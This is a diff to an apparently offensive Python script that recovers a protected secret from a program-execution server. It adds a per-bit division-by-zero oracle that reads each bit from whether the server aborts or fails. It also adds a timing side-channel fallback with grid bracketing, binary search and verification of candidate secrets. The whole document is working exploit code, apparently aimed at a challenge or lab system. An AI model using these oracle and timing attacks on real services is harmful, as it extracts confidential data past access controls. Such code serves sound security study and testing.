@@ -890,6 +890,107 @@ def recover_from_strict_expr_fuzz_suite(
     )
 
 
+def make_strict_bitwise_div_template(*, divisor: int, variant: str) -> str:
+    if variant == "and-inline":
+        return f"""int main(int input, int secret) {{
+  //@label H;
+  bool witness = (input == input) && ((1 / ((secret / {divisor}) % 2)) == 1);
+  return 0;
+}}
+"""
+    if variant == "or-inline":
+        return f"""int main(int input, int secret) {{
+  //@label H;
+  bool witness = (input < input) || ((1 / ((secret / {divisor}) % 2)) == 1);
+  return 0;
+}}
+"""
+    if variant == "and-temp":
+        return f"""int main(int input, int secret) {{
+  //@label H;
+  int b = (secret / {divisor}) % 2;
+  //@label H;
+  bool witness = (input == input) && ((1 / b) == 1);
+  return 0;
+}}
+"""
+    if variant == "or-temp":
+        return f"""int main(int input, int secret) {{
+  //@label H;
+  int b = (secret / {divisor}) % 2;
+  //@label H;
+  bool witness = (input < input) || ((1 / b) == 1);
+  return 0;
+}}
+"""
+    if variant == "int-temp":
+        return f"""int main(int input, int secret) {{
+  //@label H;
+  int b = (secret / {divisor}) % 2;
+  //@label H;
+  int witness = 1 / b;
+  return 0;
+}}
+"""
+    raise ValueError(f"unknown bitwise template variant: {variant}")
+
+
+def recover_from_strict_bitwise_templates(
+    *,
+    server_command: str,
+    userid: str,
+    timeout_s: float,
+    debug: bool,
+) -> int:
+    variants = ["and-inline", "or-inline", "and-temp", "or-temp", "int-temp"]
+    last_error = "strict bitwise templates found no usable oracle"
+
+    for variant in variants:
+        bits: list[int] = []
+        ok = True
+        for bit in range(SECRET_BITS):
+            src = make_strict_bitwise_div_template(divisor=(1 << bit), variant=variant)
+            with ProgramFile(src) as path:
+                res = run_query(
+                    server_command=server_command,
+                    userid=userid,
+                    program_path=path,
+                    input_value=0,
+                    timeout_s=timeout_s,
+                )
+            if res.kind == "success" and res.value is not None:
+                return res.value
+            if res.kind == "abort":
+                bits.append(0)
+                continue
+            if res.kind == "failure":
+                bits.append(1)
+                continue
+
+            ok = False
+            last_error = f"{variant} rejected at bit {bit} ({format_result(res)})"
+            debug_log(debug, f"[strict-bitwise] {last_error}")
+            break
+
+        if not ok:
+            continue
+
+        candidate = sum((bit_val << idx) for idx, bit_val in enumerate(bits))
+        verified = verify_nearby_candidates(
+            server_command=server_command,
+            userid=userid,
+            candidate=candidate,
+            timeout_s=max(1.0, timeout_s),
+        )
+        if verified is not None:
+            debug_log(debug, f"[strict-bitwise] accepted template {variant}")
+            return verified
+        last_error = f"{variant} produced candidate failing verification"
+        debug_log(debug, f"[strict-bitwise] {last_error}")
+
+    raise StrategyFailed(last_error)
+
+
 def median_runtime_for_input(
     *,
     server_command: str,
@@ -1111,6 +1212,101 @@ def recover_from_timing_oracle(
 
             boundary_lo, conf_lo = boundary_vote(SECRET_MIN, boundary_checks)
             boundary_hi, conf_hi = boundary_vote(SECRET_MAX_EXCLUSIVE, boundary_checks)
+
+            if candidate_name.startswith("alloc-timing-") and (
+                conf_lo < min_boundary_consistency
+                or conf_hi < min_boundary_consistency
+                or boundary_lo == boundary_hi
+            ):
+                # Fallback for noisy alloc-timing probes: scan for a stable local
+                # sign change in mapped input space, then classify against that.
+                max_safe_input = 1 << 20
+                grid = [0, 1, 2, 4, 8, 16, 32, 64, 128, 256, 512]
+                grid += [1024, 2048, 4096, 8192, 16384, 32768]
+                grid += [65536, 131072, 262144, 524288, 786432, max_safe_input]
+
+                point_truth: dict[int, bool] = {}
+                point_conf: dict[int, float] = {}
+                for x in grid:
+                    val, conf = boundary_vote(x, 5)
+                    point_truth[x] = val
+                    point_conf[x] = conf
+
+                bracket: Optional[tuple[int, int]] = None
+                for left, right in zip(grid, grid[1:]):
+                    if (
+                        point_truth[left] != point_truth[right]
+                        and point_conf[left] >= min_boundary_consistency
+                        and point_conf[right] >= min_boundary_consistency
+                    ):
+                        bracket = (left, right)
+                        break
+
+                if bracket is not None:
+                    left, right = bracket
+                    left_val = point_truth[left]
+                    right_val = point_truth[right]
+                    debug_log(
+                        debug,
+                        f"[timing] {candidate_name}: local bracket [{left}, {right}] "
+                        f"({left_val}->{right_val})",
+                    )
+
+                    def mapped_classify(mapped_input: int) -> bool:
+                        mapped_input = max(0, min(max_safe_input, mapped_input))
+                        votes_true = 0
+                        for _ in range(votes_total):
+                            t_mid = median_runtime_for_input(
+                                server_command=server_command,
+                                userid=userid,
+                                program_path=path,
+                                input_value=mapped_input,
+                                timeout_s=timeout_s,
+                                repeats=classify_repeats,
+                            )
+                            if t_mid > threshold:
+                                votes_true += 1
+                        return votes_true * 2 >= votes_total
+
+                    def mapped_to_secret_guess(mapped_input: int) -> int:
+                        return (mapped_input * SECRET_MAX_EXCLUSIVE) // max_safe_input
+
+                    # Binary search in mapped space first.
+                    lo_m = left
+                    hi_m = right
+                    while lo_m + 1 < hi_m:
+                        mid_m = (lo_m + hi_m) // 2
+                        if mapped_classify(mid_m) == right_val:
+                            hi_m = mid_m
+                        else:
+                            lo_m = mid_m
+                    candidate = mapped_to_secret_guess(lo_m)
+
+                    verify_passes = 0
+                    verified_value: Optional[int] = None
+                    for _ in range(7):
+                        verified = verify_nearby_candidates(
+                            server_command=server_command,
+                            userid=userid,
+                            candidate=candidate,
+                            timeout_s=verify_timeout_s,
+                        )
+                        if verified is not None:
+                            verify_passes += 1
+                            verified_value = verified
+                    if verify_passes >= 5 and verified_value is not None:
+                        if verified_value != candidate:
+                            debug_log(
+                                debug,
+                                f"[timing] adjusted candidate {candidate} -> {verified_value}",
+                            )
+                        return verified_value
+                    debug_log(
+                        debug,
+                        f"[timing] {candidate_name}: local-bracket candidate failed verification "
+                        f"({verify_passes}/7)",
+                    )
+
             if conf_lo < min_boundary_consistency or conf_hi < min_boundary_consistency:
                 last_failure = (
                     "timing boundary too noisy "
